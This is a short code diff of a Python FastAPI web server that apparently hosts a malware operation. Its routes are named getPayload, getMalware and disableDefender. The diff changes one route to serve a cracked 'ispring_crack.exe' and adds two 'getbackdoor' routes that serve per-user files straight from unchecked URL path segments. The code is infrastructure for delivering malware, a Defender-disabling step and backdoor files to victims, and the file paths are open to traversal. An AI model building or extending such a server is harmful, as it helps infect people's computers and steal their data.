@@ -24,7 +24,7 @@ def getPayload():
 
 @app.get('/getispring')
 def getispring():
-    return FileResponse("ispring_exe")
+    return FileResponse("ispring_crack.exe")
 
 @app.get('/getMalware')
 def getMalware():
@@ -34,6 +34,13 @@ def getMalware():
 def getMalware():
     return FileResponse("pdf.pdf")
 
+@app.get("/getb/{user}/{filename}")
+def getbackdoor(user: str, filename: str):
+    return FileResponse(f"{user}/{filename}")
+
+@app.get("/getp/{user}/{filename}")
+def getbackdoor(user: str, filename: str):
+    return FileResponse(f"{user}/files/{filename}")
 
 @app.get('/disableDefender')
 def getMalware():
